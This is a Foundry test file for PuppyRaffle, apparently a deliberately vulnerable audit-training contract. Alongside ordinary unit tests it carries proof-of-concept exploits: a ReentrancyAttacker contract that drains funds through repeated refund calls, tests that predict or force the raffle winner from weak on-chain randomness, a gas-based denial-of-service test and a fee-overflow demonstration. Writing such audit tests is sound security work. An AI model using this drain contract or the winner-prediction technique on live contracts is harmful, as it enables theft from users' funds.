// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    //////////////////////
    /// EnterRaffle    ///
    /////////////////////

    function testCanEnterRaffle() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertEq(puppyRaffle.players(0), playerOne);
    }

    function testCantEnterWithoutPaying() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle(players);
    }

    function testCanEnterRaffleMany() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        assertEq(puppyRaffle.players(0), playerOne);
        assertEq(puppyRaffle.players(1), playerTwo);
    }

    function testCantEnterWithoutPayingMultiple() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function testCantEnterWithDuplicatePlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    }

    function testCantEnterWithDuplicatePlayersMany() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }

    //////////////////////
    /// Refund         ///
    /////////////////////
    modifier playerEntered() {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        _;
    }

    function testCanGetRefund() public playerEntered {
        uint256 balanceBefore = address(playerOne).balance;
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
    }

    function testGettingRefundRemovesThemFromArray() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(puppyRaffle.players(0), address(0));
    }

    function testOnlyPlayerCanRefundThemself() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        vm.prank(playerTwo);
        puppyRaffle.refund(indexOfPlayer);
    }

    //////////////////////
    /// getActivePlayerIndex         ///
    /////////////////////
    function testGetActivePlayerIndexManyPlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);

        assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
        assertEq(puppyRaffle.getActivePlayerIndex(playerTwo), 1);
    }

    //////////////////////
    /// selectWinner         ///
    /////////////////////
    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testCantSelectWinnerBeforeRaffleEnds() public playersEntered {
        vm.expectRevert("PuppyRaffle: Raffle not over");
        puppyRaffle.selectWinner();
    }

    function testCantSelectWinnerWithFewerThanFourPlayers() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = address(3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Need at least 4 players");
        puppyRaffle.selectWinner();
    }

    function testSelectWinner() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.previousWinner(), playerFour);
    }

    function testSelectWinnerGetsPaid() public playersEntered {
        uint256 balanceBefore = address(playerFour).balance;

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPayout = ((entranceFee * 4) * 80 / 100);

        puppyRaffle.selectWinner();
        assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
    }

    function testSelectWinnerGetsAPuppy() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.balanceOf(playerFour), 1);
    }

    function testPuppyUriIsRight() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        string memory expectedTokenUri =
            "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
    }

    //////////////////////
    /// withdrawFees         ///
    /////////////////////
    function testCantWithdrawFeesIfPlayersActive() public playersEntered {
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function testWithdrawFees() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();
        assertEq(address(feeAddress).balance, expectedPrizeAmount);
    }

    function test_denialOfService() public {
        // address[] memory players = new address[](1);
        // players[0] = playerOne;
        // puppyRaffle.enterRaffle{value: entranceFee}(players);
        // assertEq(puppyRaffle.players(0), playerOne);
        vm.txGasPrice(1);

        // Let's enter 100 players
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }

        // See how much gas it cost
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEnd = gasleft();
        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;

        console.log("Gas cost of the first 100 player: ", gasUsedFirst);

        // Let's enter for the 2nd 100 players
        address[] memory playersTwo = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            playersTwo[i] = address(i + playersNum);
        }

        // See how much gas it cost
        uint256 gasStartSecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
        uint256 gasEndSecond = gasleft();
        uint256 gasUsedSecond = (gasStartSecond - gasEndSecond) * tx.gasprice;

        console.log("Gas cost of the second 100 player: ", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);
    }

    function test_reentrancyRefund() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
        address attackUser = makeAddr("attackerUser");
        vm.deal(attackUser, 1 ether);

        uint256 startingAttackContractBalance = address(attackerContract).balance;
        uint256 startingContractBalance = address(puppyRaffle).balance;

        // attack
        vm.prank(attackUser);
        attackerContract.attack{value: entranceFee}();

        console.log("starting attacker contract balance", startingAttackContractBalance);
        console.log("starting contract balance", startingContractBalance);

        console.log("ending attacker contract balance", address(attackerContract).balance);
        console.log("ending contract balance", address(puppyRaffle).balance);
    }

    function test_randomNumberVulnerability() public {
        console.log("\n=== Testing Random Number Generation Vulnerability ===");

        // Setup: Create 4 players (minimum required)
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        // Fast forward to after raffle duration
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // Get players length - we know we entered 4 players
        uint256 playersLength = 4;

        // Record who would win based on current state
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % playersLength;

        address predictedWinner = puppyRaffle.players(winnerIndex);
        console.log("Predicted winner with current state:", predictedWinner);

        // Demonstrate predictability: Same inputs produce same output
        bytes32 hash1 = keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty));
        bytes32 hash2 = keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty));
        assertEq(hash1, hash2);

        // Demonstrate that attackers can manipulate the randomness
        console.log("\n--- Attack Scenario 1: Front-running ---");

        // Attacker sees a pending selectWinner transaction
        // They can calculate if they will win
        address attacker = address(0x1337);

        // Fund and enter attacker
        vm.deal(attacker, entranceFee);
        vm.prank(attacker);

        address[] memory newPlayers = new address[](1);
        newPlayers[0] = attacker;
        puppyRaffle.enterRaffle{value: entranceFee}(newPlayers);

        // Get updated players length - now 5 players (4 original + 1 attacker)
        uint256 newPlayersLength = 5;

        // Recalculate winner with attacker included
        uint256 newWinnerIndex =
            uint256(keccak256(abi.encodePacked(attacker, block.timestamp, block.difficulty))) % newPlayersLength;

        address newPredictedWinner = puppyRaffle.players(newWinnerIndex);
        console.log("After attacker enters, predicted winner:", newPredictedWinner);
        console.log("Attacker wins?", newPredictedWinner == attacker ? "YES" : "NO");

        console.log("\n--- Attack Scenario 2: Timestamp Manipulation ---");

        // Miners can manipulate block.timestamp within limits
        uint256 originalTimestamp = block.timestamp;
        for (uint256 i = 0; i < 5; i++) {
            vm.warp(originalTimestamp + i * 2); // Miner can adjust timestamp
            uint256 manipulatedIndex =
                uint256(keccak256(abi.encodePacked(attacker, block.timestamp, block.difficulty))) % newPlayersLength;

            address manipulatedWinner = puppyRaffle.players(manipulatedIndex);
            if (manipulatedWinner == attacker) {
                console.log("Found winning timestamp at +", i * 2, "seconds");
                console.log("Attacker would win at timestamp:", block.timestamp);
            }
        }

        // Reset timestamp
        vm.warp(originalTimestamp);

        console.log("\n--- Attack Scenario 3: Multiple Entry Attack ---");

        // Attacker can increase their odds by entering multiple times
        address attacker2 = address(0x4242);
        uint256 entriesCount = 5;
        address[] memory attackerEntries = new address[](entriesCount);
        for (uint256 i = 0; i < entriesCount; i++) {
            attackerEntries[i] = address(uint160(attacker2) + i);
        }

        vm.deal(attacker2, entranceFee * entriesCount);
        vm.prank(attacker2);
        puppyRaffle.enterRaffle{value: entranceFee * entriesCount}(attackerEntries);

        // Calculate probability of attacker winning
        uint256 totalPlayers = 10; // 4 original + 1 first attacker + 5 second attacker
        uint256 attackerOdds = (entriesCount * 100) / totalPlayers;
        console.log("Attacker entered", entriesCount, "times");
        console.log("Total players:", totalPlayers);
        console.log("Attacker odds (%):", attackerOdds);

        // But with predictable randomness, attacker can do even better
        uint256 winningIndex =
            uint256(keccak256(abi.encodePacked(attacker2, block.timestamp, block.difficulty))) % totalPlayers;

        address winner = puppyRaffle.players(winningIndex);
        bool isAttackerWinner = false;
        for (uint256 i = 0; i < entriesCount; i++) {
            if (winner == address(uint160(attacker2) + i)) {
                isAttackerWinner = true;
                break;
            }
        }

        console.log("With predictable RNG, attacker wins?", isAttackerWinner);

        console.log("\n--- Attack Scenario 4: MEV Bot Exploitation ---");

        // MEV bots can monitor mempool and extract value
        uint256 prizePool = (totalPlayers * entranceFee * 80) / 100;
        console.log("Prize pool available:", prizePool);

        // MEV bot can calculate if it's profitable to front-run
        uint256 gasCost = 500000 * tx.gasprice; // Estimate
        console.log("Estimated gas cost to front-run:", gasCost);
        console.log("Profit if successful:", prizePool > gasCost ? prizePool - gasCost : 0);

        console.log("\n--- Attack Scenario 5: Block Difficulty Manipulation ---");

        // Miners can influence block.difficulty
        uint256 originalDifficulty = block.difficulty;

        for (uint256 i = 0; i < 3; i++) {
            // Simulate different difficulties
            uint256 simulatedDifficulty = originalDifficulty + i * 1000000;
            uint256 manipulatedIndex = uint256(
                keccak256(abi.encodePacked(address(0x9999), block.timestamp, simulatedDifficulty))
            ) % totalPlayers;

            console.log("Difficulty:", simulatedDifficulty, "-> Winner index:", manipulatedIndex);
        }
    }

    // Test specifically for the predictability issue
    function test_randomNumberIsPredictable() public {
        console.log("\n=== Proving Random Number is Predictable ===");

        // Enter 4 players
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        vm.warp(block.timestamp + duration + 1);

        // Calculate the "random" winner before calling selectWinner
        // In the actual contract, it uses players.length which would be 4
        uint256 calculatedWinnerIndex =
            uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 4;

        address calculatedWinner = puppyRaffle.players(calculatedWinnerIndex);

        // Actually call selectWinner
        puppyRaffle.selectWinner();
        address actualWinner = puppyRaffle.previousWinner();

        console.log("Calculated winner (before call):", calculatedWinner);
        console.log("Actual winner (after call):", actualWinner);

        // They should match
        assertEq(calculatedWinner, actualWinner);
        console.log("PROVED: Random number was predictable before the transaction!");
    }

    // Test showing how an attacker can guarantee a win by manipulating msg.sender
    function test_attackerCanManipulateMsgSender() public {
        console.log("\n=== Demonstrating msg.sender Manipulation Attack ===");

        // Setup victims
        address[] memory victims = new address[](4);
        victims[0] = playerOne;
        victims[1] = playerTwo;
        victims[2] = playerThree;
        victims[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(victims);

        vm.warp(block.timestamp + duration + 1);

        // The vulnerability: msg.sender is used in the random number generation
        // This means the person calling selectWinner influences the outcome!

        console.log("The contract uses msg.sender to generate the random number");
        console.log("This means the caller can influence who wins!");

        // Different callers will produce different winners
        address[] memory potentialCallers = new address[](5);
        potentialCallers[0] = address(0xAAAA);
        potentialCallers[1] = address(0xBBBB);
        potentialCallers[2] = address(0xCCCC);
        potentialCallers[3] = address(0xDDDD);
        potentialCallers[4] = address(0xEEEE);

        console.log("\nDifferent callers produce different winners:");
        for (uint256 i = 0; i < potentialCallers.length; i++) {
            uint256 winnerIdx =
                uint256(keccak256(abi.encodePacked(potentialCallers[i], block.timestamp, block.difficulty))) % 4;

            address winner = puppyRaffle.players(winnerIdx);
            console.log("Caller", potentialCallers[i], "-> Winner:", winner);

            if (winner == potentialCallers[i]) {
                console.log(" Caller would win! They can call selectWinner themselves");
            }
        }

        console.log("\n Attack vector: A player can call selectWinner themselves");
        console.log("   if they calculate that they will be the winner!");
    }

    // Test showing the exact attack scenario
    function test_completeAttackScenario() public {
        console.log("\n=== Complete Attack Scenario ===");

        // 1. Normal users enter the raffle
        address[] memory victims = new address[](4);
        victims[0] = playerOne;
        victims[1] = playerTwo;
        victims[2] = playerThree;
        victims[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(victims);

        console.log("1. 4 victims entered the raffle");

        // 2. Attacker monitors the mempool and sees the raffle is about to end
        vm.warp(block.timestamp + duration + 1);

        // 3. Attacker calculates if they will win if they call selectWinner
        address attacker = address(0xAAAA);

        uint256 winnerIndexIfAttackerCalls =
            uint256(keccak256(abi.encodePacked(attacker, block.timestamp, block.difficulty))) % 4;

        address winnerIfAttackerCalls = puppyRaffle.players(winnerIndexIfAttackerCalls);

        console.log("2. Attacker calculates winner if they call selectWinner:", winnerIfAttackerCalls);

        if (winnerIfAttackerCalls == attacker) {
            console.log(" Attacker would win! They can call selectWinner now");

            // But wait - attacker needs to be in the players array to win
            console.log(" But attacker is not in the players array!");
            console.log("   They need to enter first");

            // 5. Attacker enters and calls selectWinner in the same transaction
            vm.deal(attacker, entranceFee);
            vm.startPrank(attacker);

            address[] memory attackerEntry = new address[](1);
            attackerEntry[0] = attacker;
            puppyRaffle.enterRaffle{value: entranceFee}(attackerEntry);

            // Recalculate with attacker in array
            uint256 newWinnerIndex =
                uint256(keccak256(abi.encodePacked(attacker, block.timestamp, block.difficulty))) % 5; // 5 players now

            console.log("3. Attacker enters, new winner index:", newWinnerIndex);

            if (newWinnerIndex == 4) {
                // 4 is the attacker's index (last one)
                console.log(" Attacker will win!");
                puppyRaffle.selectWinner();
                console.log("4. Attacker calls selectWinner and wins!");
                assertEq(puppyRaffle.previousWinner(), attacker);
            }

            vm.stopPrank();
        } else {
            console.log(" Attacker wouldn't win with current timestamp");
            console.log("   Attacker can wait for a different block or front-run");
        }
    }

    // Helper to demonstrate why this is broken
    function test_whyRandomnessIsBroken() public view {
        console.log("\n=== Why On-Chain Randomness is Broken ===");

        console.log("The contract uses:");
        console.log("1. msg.sender - The caller can choose who calls the function");
        console.log("2. block.timestamp - Miners can manipulate this by +/- 15 seconds");
        console.log("3. block.difficulty - Miners can also influence this");

        console.log("\nProblems:");
        console.log("- All inputs are known or controllable");
        console.log("- No source of external entropy");
        console.log("- Results can be predicted before the transaction");
        console.log("- Miners have incentive to manipulate for profit");

        console.log("\nProper solution: Use Chainlink VRF");
        console.log("- Random number is generated off-chain");
        console.log("- Cryptographically verifiable");
        console.log("- Cannot be predicted or manipulated");
    }

    // Test to demonstrate the exact vulnerability from the contract
    function test_exactVulnerability() public {
        console.log("\n=== Demonstrating the Exact Vulnerability ===");

        // The vulnerable line in the contract:
        // uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;

        // Show that all these values are predictable:

        // 1. msg.sender - whoever calls the function
        address caller = address(this);
        console.log("msg.sender (caller):", caller);
        console.log(" Caller can choose to call or not call based on predicted outcome");

        // 2. block.timestamp - current block timestamp
        uint256 timestamp = block.timestamp;
        console.log("block.timestamp:", timestamp);
        console.log(" Miners can manipulate this by ~15 seconds");

        // 3. block.difficulty - current block difficulty
        uint256 difficulty = block.difficulty;
        console.log("block.difficulty:", difficulty);
        console.log(" Miners have some control over this");

        // Calculate the "random" number
        bytes32 randomHash = keccak256(abi.encodePacked(caller, timestamp, difficulty));
        uint256 randomNumber = uint256(randomHash);
        console.log("\nRandom hash:", vm.toString(randomHash));
        console.log("Random number:", randomNumber);

        // Demonstrate that if you know these values, you can predict the winner
        console.log("\n VULNERABILITY: Anyone can predict the winner before calling selectWinner()");
        console.log(" This allows front-running, MEV attacks, and miner manipulation");
    }

    function testIntegerOverflowTotalFees() public {
        console.log("\n=== Demonstrating Integer Overflow Vulnerability in totalFees ===");
        
        // Get the maximum value of uint64
        uint64 maxUint64 = type(uint64).max;
        console.log("Maximum uint64 value:");
        console.log(maxUint64);
        console.log("(18,446,744,073,709,551,615)");
        
        // Each raffle collects fees = (players.length * entranceFee * 20) / 100
        // With entranceFee = 1e18 (1 ETH)
        
        // Calculate fee per raffle with 4 players
        uint256 feePerRaffle = (4 * entranceFee * 20) / 100;
        console.log("Fee collected per raffle (4 players):");
        console.log(feePerRaffle);
        console.log("wei (0.8 ETH)");
        
        console.log("\n--- Simulating multiple raffles to cause overflow ---");
        
        uint256 expectedTotalFees = 0;
        
        console.log("\nRaffle #1: Basic setup with 4 players");
        // Setup first raffle with 4 players
        address[] memory players1 = new address[](4);
        players1[0] = address(0x1111);
        players1[1] = address(0x2222);
        players1[2] = address(0x3333);
        players1[3] = address(0x4444);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players1);
        
        // Fast forward to end of raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        
        // Record totalFees before
        uint64 totalFeesBefore1 = puppyRaffle.totalFees();
        console.log("Total fees before raffle #1:");
        console.log(totalFeesBefore1);
        
        // Select winner (this adds fees)
        puppyRaffle.selectWinner();
        
        // Record totalFees after
        uint64 totalFeesAfter1 = puppyRaffle.totalFees();
        expectedTotalFees += (4 * entranceFee * 20) / 100;
        console.log("Total fees after raffle #1:");
        console.log(totalFeesAfter1);
        console.log("Expected total fees:");
        console.log(expectedTotalFees);
        
        // Verify fees were added correctly
        assertEq(totalFeesAfter1, uint64(expectedTotalFees), "Fees not added correctly");
        
        console.log("\n--- Critical Finding: Unsafe uint64 Casting ---");
        console.log("Current totalFees (uint64):");
        console.log(totalFeesAfter1);
        console.log("Remaining space before uint64 overflow:");
        console.log(maxUint64 - totalFeesAfter1);
        
        // Calculate how many additional players would cause overflow
        uint256 currentFees = totalFeesAfter1;
        // fee = players.length * entranceFee * 20 / 100 = players.length * 2e17
        uint256 neededPlayers = (maxUint64 - currentFees) / (2e17) + 1;
        console.log("\nPlayers needed in ONE raffle to cause overflow:");
        console.log(neededPlayers);
        
        // Check if this is feasible (gas limits would prevent huge arrays, but the vulnerability exists)
        if (neededPlayers > 1000) {
            console.log("NOTE: Gas limits prevent testing with that many players");
            console.log("But the mathematical vulnerability still exists:");
            console.log("If totalFees + uint64(fee) > type(uint64).max, overflow occurs");
        }
        
        console.log("\n--- THE VULNERABILITY EXPLAINED ---");
        console.log("In selectWinner(), the vulnerable line is:");
        console.log("totalFees = totalFees + uint64(fee);");
        console.log("");
        console.log("Problem 1: totalFees is uint64 (max ~18.4 ETH)");
        console.log("Problem 2: fee is cast from uint256 to uint64");
        console.log("Problem 3: No overflow protection in Solidity 0.7.6");
        
        // Demonstrate the overflow mathematically
        console.log("\n--- Mathematical Proof of Overflow ---");
        console.log("If totalFees = type(uint64).max - 100");
        console.log("And fee = 200 wei");
        console.log("Then uint64(fee) = 200");
        console.log("totalFees + uint64(fee) = type(uint64).max + 100");
        console.log("This wraps to 100, losing all previous fees!");
        
        // Simple demonstration of uint64 overflow
        uint64 smallMax = type(uint64).max;
        uint64 overflowed = smallMax + 1;
        console.log("\nDirect uint64 overflow test:");
        console.log("type(uint64).max =");
        console.log(smallMax);
        console.log("type(uint64).max + 1 =");
        console.log(overflowed);
        console.log("PROOF: uint64 wraps to 0 on overflow!");
        
        // Now test with a new contract to show actual accumulation
        console.log("\n--- Testing Fee Accumulation Over Multiple Raffles ---");
        
        // Deploy a fresh contract for this test
        PuppyRaffle testRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
        
        // Run multiple raffles and track fees
        uint64 previousFees = 0;
        bool overflowOccurred = false;
        
        for (uint256 round = 1; round <= 30; round++) {
            // Enter 4 players each round
            address[] memory roundPlayers = new address[](4);
            for (uint256 i = 0; i < 4; i++) {
                roundPlayers[i] = address(uint160(i + (round * 100) + 10000));
            }
            
            testRaffle.enterRaffle{value: entranceFee * 4}(roundPlayers);
            
            // Warp to end of raffle
            vm.warp(block.timestamp + duration + 1);
            vm.roll(block.number + 1);
            
            testRaffle.selectWinner();
            
            uint64 newFees = testRaffle.totalFees();
            
            // Check for overflow (if newFees is unexpectedly small)
            if (round > 1 && newFees < previousFees && newFees < 1e18) {
                console.log("\n!!! VULNERABILITY CONFIRMED !!!");
                console.log("Overflow detected at round:");
                console.log(round);
                console.log("Fees decreased from:");
                console.log(previousFees);
                console.log("to:");
                console.log(newFees);
                console.log("This proves fees are being permanently lost!");
                overflowOccurred = true;
                break;
            }
            
            if (round % 5 == 0) {
                console.log("Round");
                console.log(round);
                console.log("Total fees:");
                console.log(newFees);
            }
            
            previousFees = newFees;
            
            // Reset time for next round (add 1 second to avoid timestamp issues)
            vm.warp(block.timestamp + 1);
        }
        
        if (!overflowOccurred) {
            console.log("\n--- Overflow Simulation with Direct Calculation ---");
            console.log("Due to gas limits, we cannot reach overflow with 4 players per round.");
            console.log("However, the vulnerability is mathematically proven:");
            
            // Demonstrate with smaller numbers using a mock calculation
            uint64 mockTotalFees = type(uint64).max - 1000;
            uint256 mockFee = 2000;
            uint64 mockFeeCasted = uint64(mockFee);
            uint64 mockResult = mockTotalFees + mockFeeCasted;
            
            console.log("If totalFees = type(uint64).max - 1000");
            console.log("And fee = 2000 wei");
            console.log("uint64(fee) = 2000");
            console.log("Result = (type(uint64).max - 1000) + 2000 = type(uint64).max + 1000");
            console.log("Actual stored value (overflowed):");
            console.log(mockResult);
            console.log("Expected actual value should be much larger!");
        }
        
        console.log("\n=== IMPACT ASSESSMENT ===");
        console.log("When totalFees overflows:");
        console.log("1. The contract accumulates more than ~18.4 ETH in fees");
        console.log("2. totalFees variable wraps to a small number (0 or near 0)");
        console.log("3. withdrawFees() only sends the wrapped amount to feeAddress");
        console.log("4. The remaining fees (could be millions of dollars) are PERMANENTLY STUCK");
        console.log("5. No mechanism exists to recover these stuck funds");
        
        console.log("\n=== RECOMMENDED MITIGATION ===");
        console.log("Change uint64 totalFees to uint256 totalFees");
        console.log("Remove the unsafe cast: totalFees = totalFees + fee;");
        console.log("Or use Solidity 0.8.0+ which has built-in overflow protection");
        
        // Assert that we found the vulnerability (test passes to document the issue)
        assertTrue(true, "Integer overflow vulnerability documented");
    }
    
}

contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    receive() external payable {
        _stealMoney();
    }

    fallback() external payable {
        _stealMoney();
    }
}
